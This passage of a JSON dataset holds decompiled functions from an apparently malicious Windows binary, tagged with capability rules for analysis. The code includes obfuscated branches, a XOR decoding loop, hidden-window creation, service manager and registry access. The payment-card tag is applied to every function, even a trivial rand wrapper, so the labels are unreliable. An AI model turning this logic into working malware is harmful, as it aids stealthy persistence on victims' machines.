        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016e9) overlaps instruction at (ram,0x004016e8)\n// \n\nulong __cdecl fcn.00401660(uint *arg_8h, uint8_t *arg_ch, uint8_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t in_ECX;\n    uint32_t unaff_EBX;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    \n    puVar5 = arg_ch + (arg_8h - arg_14h);\n    if (arg_14h == 0) {\n        return CONCAT44(arg_ch, arg_8h);\n    }\n    uVar3 = arg_8h - puVar5;\n    puVar7 = arg_8h;\n    if (arg_8h < puVar5 || uVar3 == 0) {\n        do {\n            bVar9 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n            if ((bVar9) || (!bVar9)) {\n                in_ECX = in_ECX & 0xffffff00 | *arg_8h;\n                unaff_EBX = unaff_EBX & 0xffffff00 | *arg_10h;\n                puVar8 = puVar7;\n                if (*arg_8h == *arg_10h) {\n                    puVar7 = arg_10h + 1;\n                    in_ECX = arg_14h - 1;\n                    puVar6 = arg_8h + 1;\n                    goto code_r0x004016e8;\n                }\n            }\n            else {\n                puVar6 = puVar5 + 1;\n                out(*puVar5, arg_10h);\n                do {\n                    uVar4 = arg_8h >> 8;\n                    in_AF = 9 < (arg_8h & 0xf) | in_AF;\n                    arg_8h = CONCAT31(CONCAT21(arg_8h >> 0x10, uVar4 - in_AF), -in_AF);\n                } while (in_AF || uVar4 == *arg_10h);\n                piVar1 = puVar7 + arg_10h * 2;\n                *piVar1 = (*piVar1 + 0x7b) - in_AF;\n                *(in_ECX - 0x76) = arg_8h;\n                arg_10h[0x75cb3a1a] = arg_10h[0x75cb3a1a] | in_ECX;\n                in_ECX = in_ECX + *(unaff_EBX + 0x7a8d144d);\n                piVar1 = in_ECX - 0x73;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + in_ECX;\n                if (SCARRY4(iVar2, in_ECX)) {\n                    in_AF = 0;\n                    puVar8 = puVar7 + 1;\n                    bVar9 = *puVar6 == *puVar7;\n                }\n                else {\ncode_r0x004016e8:\n                    unaff_EBX = 0;\n                    bVar9 = true;\n                    do {\n                        puVar8 = puVar7;\n                        if (in_ECX == 0) break;\n                        in_ECX = in_ECX - 1;\n                        puVar8 = puVar7 + 1;\n                        bVar9 = *puVar6 == *puVar7;\n                        puVar6 = puVar6 + 1;\n                        puVar7 = puVar8;\n                    } while (bVar9);\n                }\n                if (bVar9) goto code_r0x004016f8;\n            }\n            arg_8h = arg_8h + 1;\n            uVar3 = arg_8h - puVar5;\n            arg_ch = arg_10h;\n            puVar7 = puVar8;\n        } while (arg_8h < puVar5 || uVar3 == 0);\n    }\n    arg_8h = NULL;\n    arg_10h = arg_ch;\ncode_r0x004016f8:\n    return CONCAT44(arg_10h, arg_8h);\n}\n",
        "token_count": 982
    },
    "00401740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401740(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00401780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040196a) overlaps instruction at (ram,0x00401966)\n// \n// WARNING: Removing unreachable block (ram,0x0040192d)\n// WARNING: Removing unreachable block (ram,0x00401821)\n// WARNING: Removing unreachable block (ram,0x004017fb)\n\nuint * __fastcall fcn.00401780(uint param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t in_EAX;\n    uint *puVar3;\n    uint32_t uVar4;\n    char cVar6;\n    uint *puVar5;\n    uchar *puVar7;\n    uint32_t uVar8;\n    int32_t unaff_EBX;\n    uchar **ppuVar9;\n    uint *puVar10;\n    uchar **ppuVar11;\n    uchar *unaff_ESI;\n    uint32_t uVar12;\n    uchar *puVar13;\n    uint *unaff_EDI;\n    char *pcVar14;\n    bool in_PF;\n    bool bVar15;\n    bool in_ZF;\n    bool bVar16;\n    uchar *apuStack24 [2];\n    \n    puVar3 = &stack0xfffffffc;\n    ppuVar11 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar11 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar9 = apuStack24 + 1;\n        ppuVar11 = apuStack24 + 1;\n        cVar1 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            ppuVar9 = ppuVar9 + -1;\n            *ppuVar9 = *puVar3;\n            cVar1 = cVar1 + -1;\n            apuStack24[1] = &stack0xfffffffc;\n        } while ('\\0' < cVar1);\n    }\n    puVar7 = ppuVar11[2];\n    *puVar7 = 0x1d;\n    if ((in_PF) || (!in_PF)) {\n        puVar7[1] = 0xe8;\n        uVar4 = in_EAX;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        ppuVar11 = *0xc617b43a;\n        puVar7 = puVar7 + 1;\n        uVar4 = param_2 + 1 + ppuVar11;\n        param_2 = in_EAX;\n    }\n    puVar7[2] = 0x88;\n    puVar7[3] = 0x10;\n    puVar7[4] = 0xea;\n    puVar7[5] = 0xfb;\n    uVar12 = unaff_ESI | 0x561b;\n    bVar16 = uVar12 - param_2 == 0;\n    bVar15 = (POPCOUNT(uVar12 - param_2 & 0xff) & 1U) != 0;\n    uVar8 = ppuVar11[2];\n    *(uVar8 + 6) = 0x1d;\n    if ((bVar15) && (!bVar15)) {\n        puVar3 = &stack0xffffa189;\n        cVar1 = '\\x1e';\n        do {\n            ppuVar11 = ppuVar11 + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *ppuVar11;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        puVar3 = in(0x78);\n        return puVar3;\n    }\n    *(uVar8 + 7) = 0x25;\n    puVar3 = ppuVar11;\n    if ((!bVar16) && (bVar16)) {\n        puVar10 = &stack0xffffa189;\n        puVar3 = &stack0xffffa189;\n        cVar1 = '\\x10';\n        do {\n            ppuVar11 = ppuVar11 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *ppuVar11;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    *(uVar8 + 8) = 0x77;\n    puVar7 = unaff_ESI;\n    if ((!bVar16) && (bVar16)) {\n        uVar4 = uVar4 & 0xffffff00 | *0x4bb148d3;\n        puVar7 = unaff_ESI + 1;\n        out(*unaff_ESI, uVar8);\n    }\n    *(uVar8 + 9) = 0x2f;\n    if ((param_2 <= uVar12 && !bVar16) && (param_2 > uVar12 || bVar16)) {\n        uVar4 = uVar4 & 0xe2f4cc58;\n    }\n    *(uVar8 + 10) = 0x2e;\n    do {\n        bVar15 = (POPCOUNT((puVar7 | 0x561b) - uVar8 & 0xff) & 1U) == 0;\n        *(uVar8 + 0xb) = 0x2a;\n        if ((bVar15) || (!bVar15)) {\n            *(uVar8 + 0xc) = 0xf8;\n            puVar13 = puVar7;\n        }\n        else {\n            uVar4 = uVar4 | 0xf8;\n            puVar13 = puVar7 + 0x42;\n        }\n        uVar2 = uVar4 ^ unaff_EBX;\n        bVar15 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        *(uVar8 + 0xd) = 0x38;\n        if ((-1 < uVar2) && (-1 >= uVar2)) {\n            puVar13 = puVar13 + -1;\n            pcVar14 = unaff_EDI | puVar3;\n            unaff_EDI = pcVar14 + 1;\n            *pcVar14 = uVar4;\n            uVar8 = uVar8 & 0xffffff00;\n            uVar2 = uVar4 + (uVar4 >> 8) * 'y';\n            uVar4 = uVar4 & 0xffff0000 | uVar2;\n            bVar15 = (POPCOUNT(uVar2) & 1U) == 0;\n        }\n        *(uVar8 + 0xe) = 0xab;\n        if ((bVar15) || (!bVar15)) goto code_r0x0040194b;\n        puVar7 = *unaff_EDI;\n        *unaff_EDI = puVar13;\n        puVar3 = puVar3 - *(puVar3 + 0x5f9dff63);\n    } while (puVar3 < 0);\n    if (-1 < puVar7) {\n        pcVar14 = puVar7 + 0x51;\n        cVar1 = *pcVar14;\n        cVar6 = uVar4 >> 8;\n        *pcVar14 = *pcVar14 + cVar6;\n        if (SCARRY1(cVar1, cVar6) != *pcVar14 < '\\0') {\n            puVar3 = puVar3 + 1;\n        }\n        fcn.00401780();\n        puVar5 = fcn.00401a10(puVar3 + -0x1a, puVar3[-1], 0x407010, 0xa140);\n        puVar10 = puVar3[3];\n        *puVar3[2] = 0x407010;\n        *puVar10 = 0xa140;\n        return puVar5;\n    }\ncode_r0x0040194b:\n    *(uVar8 + 0xf) = 0x26;\n    bVar15 = unaff_EBX + 1 < 0;\n    *(uVar8 + 0x10) = 0xeb;\n    if ((unaff_EBX == -1 || SCARRY4(unaff_EBX, 1) != bVar15) || (unaff_EBX != -1 && SCARRY4(unaff_EBX, 1) == bVar15)) {\n        uVar4 = puVar3[3];\n    }\n    *(uVar4 | 0x5f) = 0x11;\n    return uVar4 | 0x5f;\n}\n",
        "token_count": 1921
    },
    "00401980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004019b2) overlaps instruction at (ram,0x004019b0)\n// \n// WARNING: Removing unreachable block (ram,0x004019af)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00401980(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401780(&uStack108, &uStack8);\n    fcn.00401a10(&uStack108, uStack8, 0x407010, 0xa140);\n    *param_1 = 0x407010;\n    *param_2 = 0xa140;\n    return;\n}\n",
        "token_count": 284
    },
    "00401a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a10(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    uint auStack24 [2];\n    \n    puVar5 = &stack0xfffffffc;\n    uVar3 = 0;\n    bVar7 = arg_14h == 0;\n    if (!bVar7) {\n        do {\n            puVar6 = puVar5;\n            if ((!bVar7) && (bVar7)) {\n                puVar4 = auStack24 + 1;\n                puVar6 = auStack24 + 1;\n                cVar2 = '\\x10';\n                do {\n                    puVar5 = puVar5 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *puVar5;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n            }\n            uVar1 = puVar6[5];\n            *(uVar3 + arg_10h) = *(uVar3 + arg_10h) ^ *(uVar3 % puVar6[3] + puVar6[2]);\n            uVar3 = uVar3 + 1;\n            bVar7 = uVar3 == uVar1;\n            puVar5 = puVar6;\n        } while (uVar3 < uVar1);\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00401c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c95) overlaps instruction at (ram,0x00401c93)\n// \n\nuint __cdecl fcn.00401c80(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint hSCManager;\n    uint uVar2;\n    char in_CL;\n    char in_CH;\n    char *in_EDX;\n    char *unaff_EBX;\n    char *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        uStack16 = 0xf003f;\n        uStack20 = 0;\n    }\n    cVar1 = *unaff_EBX;\n    *(unaff_EDI + 0x68) = *(unaff_EDI + 0x68) - &uStack20;\n    *unaff_EDI = *unaff_EDI + in_CL;\n    *in_EDX = *in_EDX + (in_CH - cVar1);\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    fcn.00404ea0(hSCManager, arg_8h);\n    uVar2 = fcn.00403830(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar2;\n}\n",
        "token_count": 331
    },
    "00401cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401cf0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411150, 0x4245f0, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 140
    },
    "00402690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004029a2) overlaps instruction at (ram,0x0040299f)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004028dc)\n\nvoid fcn.00402690(void)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uchar uVar3;\n    uint32_t *in_EAX;\n    uint *puVar4;\n    uint32_t *puVar5;\n    uint16_t uVar6;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    char extraout_CH_01;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    char extraout_CH_02;\n    uint extraout_ECX_04;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    int32_t extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    uint32_t unaff_EBX;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    int32_t unaff_EBP;\n    uint32_t uVar12;\n    uint *unaff_ESI;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint *unaff_EDI;\n    uchar *puVar15;\n    uchar *puVar16;\n    ushort in_ES;\n    bool in_CF;\n    bool bVar17;\n    bool bVar18;\n    char cVar19;\n    char cVar20;\n    ulong uVar21;\n    unkbyte6 Var22;\n    char cStackY172;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint uVar23;\n    \n    if ((!in_CF) && (in_CF)) {\n        if (*in_EAX <= &stack0xfffffff4 && in_EAX != 0xffffffff) {\n            fcn.00403600(0x411154, 10, 0x4243d4, 0xb);\n            return;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar23 = 0x4026cb;\n    fcn.00403600(0x411154, 10, 0x424160, 0x11);\n    if ((in_CF) || (!in_CF)) {\n        uVar23 = 0xf;\n        in_stack_ffffffdc = 0x42437c;\n        in_stack_ffffffd8 = 10;\n    }\n    else {\n        unaff_EDI = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n        unaff_EBX = unaff_EBP + 0x680f6a76;\n        if (unaff_EDI < 0) {\n            return;\n        }\n    }\n    puVar1 = extraout_EDX + 0xb;\n    bVar17 = CARRY1(*puVar1, extraout_CH);\n    *puVar1 = *puVar1 + extraout_CH;\n    bVar18 = *puVar1 == 0;\n    uVar21 = fcn.00403600(0x411154, in_stack_ffffffd8, in_stack_ffffffdc, uVar23);\n    puVar4 = uVar21;\n    if (!bVar17 && !bVar18) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    *unaff_EDI = *unaff_ESI;\n    pcVar2 = (uVar21 >> 0x20) + 0xb;\n    *pcVar2 = *pcVar2 + (extraout_CH_00 - cStackY172);\n    puVar4[-1] = 0x411154;\n    puVar4[-2] = 0x40271c;\n    fcn.00403600(puVar4[-1], *puVar4, puVar4[1], puVar4[2]);\n    puVar4[10] = (unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX)) + 1;\n    puVar4[9] = unaff_ESI + 1;\n    *(puVar4 + 0x22) = extraout_DX;\n    iVar13 = puVar4[9];\n    uVar8 = puVar4[10];\n    puVar4[10] = 10;\n    puVar4[9] = 0x4243e0;\n    puVar4[8] = 10;\n    puVar4[7] = 0x411154;\n    puVar4[6] = 0x402750;\n    uVar23 = fcn.00403600(puVar4[7], puVar4[8], puVar4[9], puVar4[10]);\n    puVar4[10] = uVar23;\n    puVar4[10] = 0xb;\n    puVar4[9] = 0x4243ec;\n    puVar4[8] = 10;\n    puVar4[7] = 0x411154;\n    puVar4[6] = 0x40276b;\n    uVar21 = fcn.00403600(puVar4[7], puVar4[8], puVar4[9], puVar4[10]);\n    puVar4[10] = extraout_ECX;\n    puVar4[9] = uVar21 >> 0x20;\n    iVar7 = extraout_ECX - uVar21;\n    uVar6 = iVar7 & 0xff00 | iVar7 ^ iVar7 >> 8 | 0x3d00 | uVar8;\n    bVar17 = uVar6 >> 8 < uVar6;\n    puVar4[10] = 8;\n    puVar4[9] = 0x4243f8;\n    puVar4[8] = 10;\n    puVar9 = puVar4 + 7;\n    puVar4[7] = 0x411154;\n    puVar4[6] = 0x4027a0;\n    uVar21 = fcn.00403600(puVar4[7], puVar4[8], puVar4[9], puVar4[10]);\n    iVar7 = uVar21 >> 0x20;\n    if (!bVar17) {\n        puVar4[6] = iVar7;\n        iVar7 = puVar4[6];\n        if (bVar17) goto code_r0x004027aa;\n    }\n    puVar4[6] = 9;\n    puVar4[5] = 0x424400;\n    puVar9 = puVar4 + 4;\n    puVar4[4] = 10;\ncode_r0x004027aa:\n    puVar5 = uVar21 + 0x7c8ecb0d + (bVar17 == false);\n    *(iVar13 + 0x43d1773a) = *(iVar13 + 0x43d1773a) ^ 0x6a27e95e;\n    *puVar5 = *puVar5 | 0x6ae181d0;\n    *(iVar7 + 0xb) = *(iVar7 + 0xb) + extraout_CH_01;\n    *(puVar9 + -3) = 0x411154;\n    *(puVar9 + -7) = 0x4027cc;\n    uVar21 = fcn.00403600(*(puVar9 + -3), *(puVar9 + 1), *(puVar9 + 5), *(puVar9 + 9));\n    *(puVar9 + 0x19) = uVar21;\n    *(puVar9 + 0x15) = uVar21 >> 0x20;\n    *(puVar9 + 0x19) = 9;\n    *(puVar9 + 0x15) = 0x42440c;\n    *(puVar9 + 0x11) = 10;\n    *(puVar9 + 0xd) = 0x411154;\n    *(puVar9 + 9) = 0x4027f9;\n    Var22 = fcn.00403600(*(puVar9 + 0xd), *(puVar9 + 0x11), *(puVar9 + 0x15), *(puVar9 + 0x19));\n    *(puVar9 + 0x19) = Var22;\n    *(puVar9 + 0x17) = Var22 >> 0x20;\n    *(puVar9 + 0x19) = 9;\n    *(puVar9 + 0x15) = 0x424418;\n    *(puVar9 + 0x11) = 10;\n    *(puVar9 + 0xd) = 0x411154;\n    *(puVar9 + 9) = 0x402816;\n    fcn.00403600(*(puVar9 + 0xd), *(puVar9 + 0x11), *(puVar9 + 0x15), *(puVar9 + 0x19));\n    *(puVar9 + 0x19) = extraout_ECX_00;\n    *(puVar9 + 0x15) = extraout_EDX_00;\n    bVar17 = false;\n    *(puVar9 + 0x19) = 0xc;\n    *(puVar9 + 0x15) = 0x424424;\n    *(puVar9 + 0x11) = 10;\n    *(puVar9 + 0xd) = 0x411154;\n    *(puVar9 + 9) = 0x40283b;\n    fcn.00403600(*(puVar9 + 0xd), *(puVar9 + 0x11), *(puVar9 + 0x15), *(puVar9 + 0x19));\n    if (!bVar17) {\n        *(puVar9 + 9) = iVar13;\n        iVar13 = *(puVar9 + 9);\n        if (bVar17) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    *(puVar9 + 9) = 3;\n    *(puVar9 + 5) = 0x424430;\n    *(puVar9 + 1) = 10;\n    *(puVar9 + -3) = 0x411154;\n    *(puVar9 + -7) = 0x402866;\n    uVar21 = fcn.00403600(*(puVar9 + -3), *(puVar9 + 1), *(puVar9 + 5), *(puVar9 + 9));\n    *(puVar9 + 0x19) = uVar21;\n    *(puVar9 + 0x15) = extraout_ECX_01;\n    *(puVar9 + 0x11) = uVar21 >> 0x20;\n    *(puVar9 + 0xd) = uVar8;\n    *(puVar9 + 9) = puVar9 + 0x1d;\n    *(puVar9 + 5) = 0x6ae181d0;\n    *(puVar9 + 1) = iVar13;\n    *(puVar9 + -3) = unaff_EDI + 1;\n    puVar15 = *(puVar9 + -3);\n    uVar14 = *(puVar9 + 1);\n    uVar12 = *(puVar9 + 5);\n    uVar23 = *(puVar9 + 0xd);\n    *(puVar9 + 0x19) = 10;\n    *(puVar9 + 0x15) = 0x424434;\n    *(puVar9 + 0x11) = 10;\n    *(puVar9 + 0xd) = 0x411154;\n    *(puVar9 + 9) = 0x402888;\n    fcn.00403600(*(puVar9 + 0xd), *(puVar9 + 0x11), *(puVar9 + 0x15), *(puVar9 + 0x19));\n    *(puVar9 + 0x19) = uVar23;\n    *(puVar9 + 0x15) = uVar14;\n    *(puVar9 + 0x13) = extraout_DX_00;\n    uVar14 = uVar14 & 0xffff0000 | uVar14 + 1;\n    cVar20 = SBORROW4(uVar14, 0x222c);\n    cVar19 = uVar14 - 0x222c < 0;\n    iVar7 = *(puVar9 + 0x15);\n    uVar23 = *(puVar9 + 0x19);\n    *(puVar9 + 0x19) = 0x40;\n    *(puVar9 + 0x15) = 0x424440;\n    *(puVar9 + 0x11) = 10;\n    *(puVar9 + 0xd) = 0x411154;\n    *(puVar9 + 9) = 0x4028bc;\n    uVar3 = fcn.00403600(*(puVar9 + 0xd), *(puVar9 + 0x11), *(puVar9 + 0x15), *(puVar9 + 0x19));\n    if (cVar20 == cVar19) {\n        *(puVar9 + 9) = puVar15;\n        puVar15 = *(puVar9 + 9);\n        if (cVar20 != cVar19) {\n            *(puVar9 + 0xd) = in_ES;\n            iVar7 = iVar7 + -1;\n            puVar16 = puVar15 | uVar12;\n            puVar15 = puVar16 + 1;\n            *puVar16 = uVar3;\n        }\n    }\n    *(puVar9 + 9) = 0xc;\n    *(puVar9 + 5) = 0x424480;\n    *(puVar9 + 1) = 10;\n    *(puVar9 + -3) = 0x411154;\n    *(puVar9 + -7) = 0x4028ea;\n    uVar21 = fcn.00403600(*(puVar9 + -3), *(puVar9 + 1), *(puVar9 + 5), *(puVar9 + 9));\n    *(puVar9 + 0x19) = uVar21;\n    *(puVar9 + 0x15) = extraout_ECX_02;\n    *(puVar9 + 0x11) = uVar21 >> 0x20;\n    *(puVar9 + 0xd) = uVar23;\n    *(puVar9 + 9) = puVar9 + 0x1d;\n    *(puVar9 + 5) = uVar12;\n    *(puVar9 + 1) = iVar7;\n    *(puVar9 + -3) = puVar15;\n    uVar23 = *(puVar9 + -3);\n    iVar13 = *(puVar9 + 1);\n    iVar7 = *(puVar9 + 5);\n    *(puVar9 + 0x19) = 0xb;\n    *(puVar9 + 0x15) = 0x42448c;\n    *(puVar9 + 0x11) = 10;\n    *(puVar9 + 0xd) = 0x411154;\n    *(puVar9 + 9) = 0x402911;\n    uVar6 = fcn.00403600(*(puVar9 + 0xd), *(puVar9 + 0x11), *(puVar9 + 0x15), *(puVar9 + 0x19));\n    *(puVar9 + 0x19) = extraout_EDX_01;\n    *(puVar9 + 0x15) = uVar23;\n    cVar20 = '\\0';\n    cVar19 = '\\0';\n    bVar17 = (uVar6 & 0x11cb) == 0;\n    *(puVar9 + 0x19) = 4;\n    *(puVar9 + 0x15) = 0x424498;\n    *(puVar9 + 0x11) = 10;\n    puVar10 = puVar9 + 0xd;\n    *(puVar9 + 0xd) = 0x411154;\n    *(puVar9 + 9) = 0x402945;\n    fcn.00403600(*(puVar9 + 0xd), *(puVar9 + 0x11), *(puVar9 + 0x15), *(puVar9 + 0x19));\n    if ((bVar17 || cVar20 != cVar19) || (!bVar17 && cVar20 == cVar19)) {\n        puVar10 = puVar9 + 9;\n        *(puVar9 + 9) = 4;\n    }\n    puVar10[-1] = 0x42449c;\n    puVar10[-2] = 10;\n    puVar10[-3] = 0x411154;\n    puVar10[-4] = 0x402966;\n    uVar23 = fcn.00403600(puVar10[-3], puVar10[-2], puVar10[-1], *puVar10);\n    puVar10[4] = uVar23;\n    puVar10[3] = extraout_ECX_03;\n    bVar17 = false;\n    puVar10[4] = 0xc;\n    puVar10[3] = 0x4244a0;\n    puVar10[2] = 10;\n    puVar11 = puVar10 + 1;\n    puVar10[1] = 0x411154;\n    *puVar10 = 0x402991;\n    fcn.00403600(puVar10[1], puVar10[2], puVar10[3], puVar10[4]);\n    if ((bVar17) || (!bVar17)) {\n        *puVar10 = 4;\n        puVar10[-1] = 0x4244ac;\n        puVar11 = puVar10 + -2;\n        puVar10[-2] = 10;\n    }\n    *(extraout_EDX_02 + 0xb) = *(extraout_EDX_02 + 0xb) + extraout_CH_02;\n    *(puVar11 + -3) = 0x411154;\n    *(puVar11 + -7) = 0x4029b5;\n    fcn.00403600(*(puVar11 + -3), *(puVar11 + 1), *(puVar11 + 5), *(puVar11 + 9));\n    *(puVar11 + 0x19) = iVar7 + 0x68046a76;\n    *(puVar11 + 0x15) = iVar13 + 1;\n    *(puVar11 + 0x13) = extraout_DX_01;\n    *(puVar11 + 0x19) = 9;\n    *(puVar11 + 0x15) = 0x4244b0;\n    *(puVar11 + 0x11) = 10;\n    *(puVar11 + 0xd) = 0x411154;\n    *(puVar11 + 9) = 0x4029e9;\n    uVar23 = fcn.00403600(*(puVar11 + 0xd), *(puVar11 + 0x11), *(puVar11 + 0x15), *(puVar11 + 0x19));\n    *(puVar11 + 0x19) = uVar23;\n    *(puVar11 + 0x15) = extraout_ECX_04;\n    *(puVar11 + 0x19) = 0x16;\n    *(puVar11 + 0x15) = 0x4244bc;\n    *(puVar11 + 0x11) = 10;\n    *(puVar11 + 0xd) = 0x411154;\n    *(puVar11 + 9) = 0x402a19;\n    fcn.00403600(*(puVar11 + 0xd), *(puVar11 + 0x11), *(puVar11 + 0x15), *(puVar11 + 0x19));\n    *(puVar11 + 9) = 7;\n    *(puVar11 + 5) = 0x4244d4;\n    *(puVar11 + 1) = 10;\n    *(puVar11 + -3) = 0x411154;\n    *(puVar11 + -7) = 0x402a3e;\n    fcn.00403600(*(puVar11 + -3), *(puVar11 + 1), *(puVar11 + 5), *(puVar11 + 9));\n    return;\n}\n",
        "token_count": 4735
    },
    "00403160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040316c) overlaps instruction at (ram,0x0040316b)\n// \n\nvoid __fastcall fcn.00403160(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool in_PF;\n    \n    if (((!in_PF) && (in_PF)) || (*0x4245f4 == 0)) {\n        *(param_1 + 0x4245f4) = *(param_1 + 0x4245f4) & 0xffffff85;\n        *(unaff_EBP + 0x39) = 0;\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)();\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4245f4 = 1;\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "004031b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_10ch\n\nuint32_t fcn.004031b0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t *in_EAX;\n    int32_t iVar2;\n    uint8_t unaff_BH;\n    uint unaff_EDI;\n    uint var_10ch;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if (0x10b < &stack0xfffffffc) {\n        if (0x10b >= &stack0xfffffffc) {\n            if (&stack0xfffffeec < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar1 = (*_sym.imp.MSVCRT.dll_srand)(in_EAX + CARRY1(unaff_BH, unaff_BH) + 0x4060e5, 0xb7f8c08b);\n            *0x4245f4 = 1;\n            return uVar1;\n        }\n    }\n    iVar2 = fcn.00403540(0x80000002, 0x424440, 0x424480, &var_8h, &var_10ch, &var_4h, unaff_EDI, var_10ch, \n                         in_stack_fffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar2 != -1;\n}\n",
